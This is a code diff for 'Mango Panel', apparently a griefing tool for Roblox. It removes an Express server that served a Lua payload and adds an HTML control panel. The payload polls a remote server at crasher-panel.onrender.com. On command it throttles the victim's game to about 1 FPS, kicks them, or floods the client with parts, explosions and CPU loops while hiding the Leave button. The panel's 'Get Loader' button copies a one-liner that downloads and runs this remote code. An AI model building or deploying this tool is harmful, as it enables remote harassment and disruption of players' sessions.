@@ -1,236 +1,729 @@
-const express = require('express');
-const cors = require('cors');
-const app = express();
-const PORT = process.env.PORT || 3000;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mango Panel</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-app.use(cors());
-app.use(express.json());
-app.use(express.static('public'));
+        :root {
+            --bg: #0a0a0a;
+            --bg-card: #111111;
+            --bg-card-hover: #1a1a1a;
+            --border: #1e1e1e;
+            --border-active: #2a2a2a;
+            --text: #e8e8e8;
+            --text-secondary: #888888;
+            --text-muted: #555555;
+            --accent: #f5a623;
+            --accent-dim: rgba(245, 166, 35, 0.08);
+            --accent-glow: rgba(245, 166, 35, 0.15);
+            --red: #e74c3c;
+            --red-dim: rgba(231, 76, 60, 0.1);
+            --green: #2ecc71;
+            --green-dim: rgba(46, 204, 113, 0.1);
+            --amber: #f39c12;
+            --radius: 10px;
+            --radius-sm: 6px;
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            --mono: 'JetBrains Mono', monospace;
+        }
 
-const players = {};
+        html, body {
+            background: var(--bg);
+            height: 100%;
+            font-family: var(--font);
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
+        }
 
-app.get('/api/register', (req, res) => {
-    const username = req.query.username;
-    if (!username) return res.status(400).send('Username required');
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-active);
+            border-radius: 4px;
+        }
 
-    if (!players[username]) {
-        players[username] = {
-            command: null,
-            lagActive: false,
-            crashActive: false
-        };
-    }
-    res.send('OK');
-});
+        /* === LOGIN === */
+        .login-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: var(--bg);
+        }
+        .login-overlay.hidden {
+            display: none;
+        }
+        .login-card {
+            width: 100%;
+            max-width: 360px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 40px 32px 32px;
+        }
+        .login-brand {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-align: center;
+            margin-bottom: 4px;
+            color: var(--text);
+        }
+        .login-brand span {
+            color: var(--accent);
+        }
+        .login-sub {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 400;
+            margin-bottom: 28px;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .login-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: 13px;
+            outline: none;
+            text-align: center;
+            transition: border-color 0.2s;
+        }
+        .login-input:focus {
+            border-color: var(--accent);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--accent);
+            border: none;
+            border-radius: var(--radius-sm);
+            color: #000;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .login-btn:hover {
+            opacity: 0.85;
+        }
+        .login-error {
+            color: var(--red);
+            font-size: 12px;
+            text-align: center;
+            min-height: 18px;
+        }
 
-app.get('/api/players', (req, res) => {
-    const list = Object.keys(players).map(name => ({
-        username: name,
-        lagActive: players[name].lagActive || false,
-        crashActive: players[name].crashActive || false
-    }));
-    res.json(list);
-});
+        /* === MAIN === */
+        .main-panel {
+            display: none;
+            padding: 24px 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .main-panel.visible {
+            display: block;
+        }
 
-app.post('/api/command', (req, res) => {
-    const { username, command, value } = req.body;
+        /* === HEADER === */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-brand {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+        .header-brand span {
+            color: var(--accent);
+        }
+        .loader-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 6px 14px;
+            font-size: 12px;
+            font-weight: 500;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: var(--font);
+        }
+        .loader-btn:hover {
+            border-color: var(--accent);
+            color: var(--text);
+        }
+        .header-stats {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+        .header-stats .dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--green);
+        }
+        .header-stats .count {
+            color: var(--text);
+            font-weight: 600;
+        }
 
-    if (!username || !command) {
-        return res.status(400).json({ error: 'Missing fields' });
-    }
+        /* === GRID === */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            gap: 24px;
+        }
+        @media (max-width: 860px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
 
-    if (!players[username]) {
-        return res.status(404).json({ error: 'Player not found' });
-    }
+        /* === PLAYERS === */
+        .players-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            min-height: 400px;
+        }
+        .search-input {
+            width: 100%;
+            padding: 10px 14px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text);
+            font-size: 13px;
+            outline: none;
+            margin-bottom: 16px;
+            font-family: var(--font);
+            transition: border-color 0.2s;
+        }
+        .search-input:focus {
+            border-color: var(--border-active);
+        }
+        .search-input::placeholder {
+            color: var(--text-muted);
+        }
+        .player-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 8px;
+            max-height: 460px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+        .player-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 10px 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.15s;
+        }
+        .player-card:hover {
+            background: var(--bg-card-hover);
+            border-color: var(--border-active);
+        }
+        .player-card.selected {
+            border-color: var(--accent);
+            background: var(--accent-dim);
+        }
+        .player-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: var(--radius-sm);
+            background: rgba(255,255,255,0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--text-secondary);
+            flex-shrink: 0;
+            border: 1px solid var(--border);
+        }
+        .player-name {
+            font-size: 13px;
+            font-weight: 500;
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .player-status {
+            font-size: 10px;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+        .player-status.active {
+            color: var(--accent);
+        }
+        .empty-state {
+            color: var(--text-muted);
+            text-align: center;
+            padding: 40px 20px;
+            font-size: 14px;
+        }
 
-    players[username].command = command;
+        /* === COMMANDS === */
+        .commands-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+        }
+        .commands-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        .commands-title .target {
+            color: var(--accent);
+        }
+        .cmd-group {
+            margin-bottom: 16px;
+        }
+        .cmd-group:last-child {
+            margin-bottom: 0;
+        }
+        .cmd-label {
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            display: block;
+        }
 
-    if (command === 'lag' && value !== undefined) {
-        players[username].lagActive = value;
-    }
+        /* Toggle */
+        .toggle {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+        .toggle:hover {
+            border-color: var(--border-active);
+        }
+        .toggle.active {
+            border-color: var(--accent);
+            background: var(--accent-dim);
+        }
+        .toggle .label {
+            font-size: 13px;
+            font-weight: 400;
+        }
+        .toggle .status {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-muted);
+        }
+        .toggle.active .status {
+            color: var(--accent);
+        }
 
-    if (command === 'crash') {
-        players[username].crashActive = value !== undefined ? value : true;
-    }
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 10px 16px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.15s;
+            background: rgba(0,0,0,0.3);
+            color: var(--text);
+            font-family: var(--font);
+            flex: 1;
+            min-width: 80px;
+            text-align: center;
+        }
+        .btn:hover {
+            background: var(--bg-card-hover);
+        }
+        .btn-danger {
+            color: var(--red);
+            border-color: rgba(231, 76, 60, 0.2);
+        }
+        .btn-danger:hover {
+            background: var(--red-dim);
+            border-color: var(--red);
+        }
+        .btn-warning {
+            color: var(--amber);
+            border-color: rgba(243, 156, 18, 0.2);
+        }
+        .btn-warning:hover {
+            background: rgba(243, 156, 18, 0.08);
+            border-color: var(--amber);
+        }
+        .btn-success {
+            color: var(--green);
+            border-color: rgba(46, 204, 113, 0.2);
+        }
+        .btn-success:hover {
+            background: var(--green-dim);
+            border-color: var(--green);
+        }
+        .btn-danger.active {
+            background: var(--red-dim);
+            border-color: var(--red);
+        }
 
-    res.json({ success: true });
-});
+        /* === TOAST === */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 10px 24px;
+            border-radius: var(--radius-sm);
+            font-size: 13px;
+            color: var(--text-secondary);
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 999;
+            pointer-events: none;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
 
-app.get('/api/get_commands', (req, res) => {
-    const username = req.query.username;
+        /* === RESPONSIVE === */
+        @media (max-width: 480px) {
+            .header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .header-left {
+                justify-content: space-between;
+            }
+            .login-card {
+                padding: 28px 20px 24px;
+            }
+            .player-grid {
+                grid-template-columns: 1fr;
+            }
+            .btn {
+                min-width: 60px;
+                font-size: 12px;
+                padding: 8px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
 
-    if (!username || !players[username]) {
-        return res.send('');
-    }
+<!-- LOGIN -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-card">
+        <div class="login-brand">Mango <span>Panel</span></div>
+        <div class="login-sub">Enter panel password</div>
+        <form class="login-form" id="loginForm" onsubmit="return false;">
+            <input type="password" class="login-input" id="keyInput" placeholder="Password" autocomplete="off" autofocus />
+            <div class="login-error" id="loginError"></div>
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+    </div>
+</div>
 
-    const cmd = players[username].command || '';
-    players[username].command = null;
-    res.send(cmd);
-});
+<!-- MAIN -->
+<div class="main-panel" id="mainPanel">
+    <header class="header">
+        <div class="header-left">
+            <span class="header-brand">Mango <span>Panel</span></span>
+            <button class="loader-btn" id="getLoaderBtn">Get Loader</button>
+        </div>
+        <div class="header-stats">
+            <span class="dot"></span>
+            <span class="count" id="onlineCount">0</span> players
+        </div>
+    </header>
 
-app.get('/api/get_exec_script', (req, res) => {
-    const script = `
-local s="https://crasher-panel.onrender.com"
-_G.ToozeServer=s
+    <div class="grid">
+        <!-- PLAYERS -->
+        <section class="players-section">
+            <input type="text" class="search-input" id="searchInput" placeholder="Search players..." />
+            <div class="player-grid" id="playerGrid"></div>
+        </section>
 
-local p=game.Players.LocalPlayer
-if not p then return end
+        <!-- COMMANDS -->
+        <aside class="commands-section">
+            <div class="commands-title">
+                Control: <span class="target" id="targetName">none selected</span>
+            </div>
 
-local R=game:GetService("RunService")
-local W=game:GetService("Workspace")
-local L=game:GetService("Lighting")
-local C=game:GetService("CoreGui")
-local G=game:GetService("GuiService")
-local A=game:GetService("ContextActionService")
+            <div class="cmd-group">
+                <span class="cmd-label">Performance</span>
+                <div class="toggle" id="toggleLag">
+                    <span class="label">Limit to 1 FPS</span>
+                    <span class="status" id="lagStatus">OFF</span>
+                </div>
+            </div>
 
-local state={lag=false,crash=false,conns={}}
+            <div class="cmd-group">
+                <span class="cmd-label">Actions</span>
+                <div class="btn-group">
+                    <button class="btn btn-danger" id="btnKick">Kick</button>
+                    <button class="btn btn-warning" id="btnCrash">Crash</button>
+                    <button class="btn btn-success" id="btnStopCrash" style="display:none;">Disable</button>
+                </div>
+            </div>
+        </aside>
+    </div>
+</div>
 
-local function reg()
-    pcall(function() game:HttpGet(s.."/api/register?username="..p.Name) end)
-end
+<div class="toast" id="toast"></div>
 
--- Anti-Leave
-local function blockLeave()
-    local rg=C:FindFirstChild("RobloxGui")
-    if rg then
-        local lb=rg:FindFirstChild("LeaveButton")
-        if lb then lb.Visible=false lb.Active=false lb.Selectable=false end
-    end
-    A:BindAction("anti",function() return Enum.ContextActionResult.Sink end,false,Enum.KeyCode.Escape)
-end
+<script>
+    // === CONFIG ===
+    const SERVER_URL = "https://crasher-panel.onrender.com";
+    const ADMIN_PASSWORD = "admin123";
 
-local function unblockLeave()
-    A:UnbindAction("anti")
-    local rg=C:FindFirstChild("RobloxGui")
-    if rg then
-        local lb=rg:FindFirstChild("LeaveButton")
-        if lb then lb.Visible=true lb.Active=true lb.Selectable=true end
-    end
-end
+    let currentTarget = null;
+    let authToken = "";
+    let playersData = {};
 
--- Lag
-local function startLag()
-    if state.lag then return end
-    state.lag=true
-    local c=R.RenderStepped:Connect(function()
-        while state.lag do
-            local t=os.clock() while os.clock()-t<0.99 do end
-            task.wait()
-        end
-    end)
-    table.insert(state.conns,c)
-end
+    const $ = (s) => document.querySelector(s);
+    const $$ = (s) => document.querySelectorAll(s);
 
-local function stopLag()
-    state.lag=false
-    for _,c in ipairs(state.conns) do pcall(c.Disconnect,c) end
-    state.conns={}
-end
-
--- Crash
-local function startCrash()
-    if state.crash then return end
-    state.crash=true
-    blockLeave()
-
-    task.spawn(function()
-        for i=1,10000 do
-            if not state.crash then break end
-            local pt=Instance.new("Part")
-            pt.Size=Vector3.new(50,50,50)
-            pt.CFrame=CFrame.new(math.random(-5000,5000),math.random(0,5000),math.random(-5000,5000))
-            pt.Anchored=true pt.Material=Enum.Material.Neon pt.Parent=W
-            if i%100==0 then task.wait() end
-        end
-    end)
-
-    task.spawn(function()
-        while state.crash do
-            for i=1,100000 do
-                local _=math.sqrt(i)*math.sin(i)*math.cos(i)
-                for j=1,100 do local __=_*j/(j+1) end
-            end
-            task.wait()
-        end
-    end)
-
-    local c=R.RenderStepped:Connect(function()
-        while state.crash do
-            local t=os.clock() while os.clock()-t<0.99 do end
-            task.wait()
-        end
-    end)
-    table.insert(state.conns,c)
-
-    task.spawn(function()
-        while state.crash do
-            for i=1,50 do
-                local e=Instance.new("Explosion")
-                e.Position=Vector3.new(math.random(-2000,2000),math.random(0,500),math.random(-2000,2000))
-                e.BlastRadius=100 e.BlastPressure=1000000 e.Parent=W
-            end
-            task.wait(0.01)
-        end
-    end)
-
-    task.spawn(function()
-        while state.crash do
-            L.Brightness=math.random()
-            L.ClockTime=math.random(0,24)
-            L.FogEnd=math.random(0,1000)
-            L.OutdoorAmbient=Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
-            task.wait(0.01)
-        end
-    end)
-end
-
-local function stopCrash()
-    state.crash=false
-    unblockLeave()
-    for _,c in ipairs(state.conns) do pcall(c.Disconnect,c) end
-    state.conns={}
-    pcall(function()
-        for _,v in pairs(W:GetChildren()) do
-            if v:IsA("Part") and v.Size==Vector3.new(50,50,50) and v.Material==Enum.Material.Neon then
-                v:Destroy()
-            end
-        end
-    end)
-end
-
-local function check()
-    local ok,cmd=pcall(function() return game:HttpGet(s.."/api/get_commands?username="..p.Name) end)
-    if not ok then return end
-
-    if cmd=="kick" then
-        p:Kick("Kicked via Mango Panel")
-    elseif cmd=="crash" then
-        if state.crash then stopCrash() else startCrash() end
-    elseif cmd=="lag" then
-        if state.lag then stopLag() else startLag() end
-    end
-end
-
-reg()
-while task.wait(2) do check() end
-    `;
-
-    res.setHeader('Content-Type', 'text/plain');
-    res.send(script);
-});
-
-app.get('/api/status', (req, res) => {
-    res.json({
-        status: 'online',
-        players: Object.keys(players).length,
-        uptime: process.uptime()
+    // === LOGIN ===
+    $('#loginForm').addEventListener('submit', () => {
+        const password = $('#keyInput').value;
+        if (password === ADMIN_PASSWORD) {
+            authToken = password;
+            $('#loginOverlay').classList.add('hidden');
+            $('#mainPanel').classList.add('visible');
+            startPolling();
+        } else {
+            $('#loginError').textContent = 'Invalid password';
+        }
     });
-});
 
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Mango Panel running on port ${PORT}`);
-});
+    // === LOADER ===
+    $('#getLoaderBtn').addEventListener('click', () => {
+        const script = `local s="https://crasher-panel.onrender.com"_G.ToozeServer=s loadstring(game:HttpGet(s.."/api/get_exec_script"))()`;
+        navigator.clipboard.writeText(script).then(() => showToast('Loader copied to clipboard'));
+    });
 
-app.use((err, req, res, next) => {
-    res.status(500).json({ error: 'Internal error' });
-});
+    // === UPDATE PLAYERS ===
+    async function updatePlayers() {
+        try {
+            const res = await fetch(`${SERVER_URL}/api/players`, {
+                headers: { 'Authorization': authToken }
+            });
+            const players = await res.json();
+
+            playersData = {};
+            players.forEach(p => { playersData[p.username] = p; });
+
+            $('#onlineCount').textContent = players.length;
+
+            const grid = $('#playerGrid');
+            const query = $('#searchInput').value.toLowerCase();
+            const filtered = players.filter(p => p.username.toLowerCase().includes(query));
+
+            if (filtered.length === 0) {
+                grid.innerHTML = '<div class="empty-state">No players online</div>';
+                return;
+            }
+
+            grid.innerHTML = '';
+            filtered.forEach(p => {
+                const card = document.createElement('div');
+                const selected = currentTarget === p.username;
+                card.className = `player-card ${selected ? 'selected' : ''}`;
+
+                let status = '';
+                if (p.crashActive) status = 'crash';
+                else if (p.lagActive) status = 'lag';
+
+                card.innerHTML = `
+                    <div class="player-avatar">${p.username.charAt(0).toUpperCase()}</div>
+                    <div class="player-name">${p.username}</div>
+                    <div class="player-status ${status ? 'active' : ''}">${status || 'online'}</div>
+                `;
+                card.addEventListener('click', () => selectPlayer(p.username));
+                grid.appendChild(card);
+            });
+        } catch (e) {
+            // silent fail
+        }
+    }
+
+    // === SELECT PLAYER ===
+    function selectPlayer(username) {
+        currentTarget = username;
+        $('#targetName').textContent = username;
+
+        $$('.player-card').forEach(c => c.classList.remove('selected'));
+        $$('.player-card').forEach(c => {
+            if (c.textContent.includes(username)) {
+                c.classList.add('selected');
+            }
+        });
+
+        const p = playersData[username];
+        if (p) {
+            const toggle = $('#toggleLag');
+            toggle.classList.toggle('active', p.lagActive || false);
+            $('#lagStatus').textContent = p.lagActive ? 'ON' : 'OFF';
+
+            const crashBtn = $('#btnCrash');
+            const stopBtn = $('#btnStopCrash');
+            if (p.crashActive) {
+                crashBtn.style.display = 'none';
+                stopBtn.style.display = 'block';
+                stopBtn.classList.add('active');
+            } else {
+                crashBtn.style.display = 'block';
+                stopBtn.style.display = 'none';
+                stopBtn.classList.remove('active');
+            }
+        }
+    }
+
+    // === SEND COMMAND ===
+    async function sendCommand(command, value = null) {
+        if (!currentTarget) {
+            showToast('Select a player first');
+            return;
+        }
+        try {
+            const res = await fetch(`${SERVER_URL}/api/command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': authToken
+                },
+                body: JSON.stringify({ username: currentTarget, command, value })
+            });
+
+            if (res.ok) {
+                const names = { kick: 'Kick', crash: 'Crash', lag: 'FPS limit' };
+                const msg = value === false ? `Disabled ${names[command] || command}` : `${names[command] || command} sent`;
+                showToast(`${msg} → ${currentTarget}`);
+            } else {
+                showToast(`Error: ${res.status}`);
+            }
+        } catch (e) {
+            showToast('Request failed');
+        }
+    }
+
+    // === EVENT BINDINGS ===
+    $('#toggleLag').addEventListener('click', function () {
+        const active = !this.classList.contains('active');
+        this.classList.toggle('active', active);
+        $('#lagStatus').textContent = active ? 'ON' : 'OFF';
+        sendCommand('lag', active);
+    });
+
+    $('#btnKick').addEventListener('click', () => sendCommand('kick'));
+
+    $('#btnCrash').addEventListener('click', function () {
+        sendCommand('crash', true);
+        this.style.display = 'none';
+        const stop = $('#btnStopCrash');
+        stop.style.display = 'block';
+        stop.classList.add('active');
+    });
+
+    $('#btnStopCrash').addEventListener('click', function () {
+        sendCommand('crash', false);
+        this.style.display = 'none';
+        this.classList.remove('active');
+        $('#btnCrash').style.display = 'block';
+    });
+
+    $('#searchInput').addEventListener('input', updatePlayers);
+
+    // === TOAST ===
+    function showToast(msg) {
+        const t = $('#toast');
+        t.textContent = msg;
+        t.classList.add('show');
+        clearTimeout(t._timer);
+        t._timer = setTimeout(() => t.classList.remove('show'), 2800);
+    }
+
+    // === POLLING ===
+    function startPolling() {
+        updatePlayers();
+        setInterval(updatePlayers, 3000);
+    }
+
+    // Enter to login
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && $('#keyInput').value) {
+            $('#loginForm').dispatchEvent(new Event('submit'));
+        }
+    });
+</script>
+</body>
+</html>
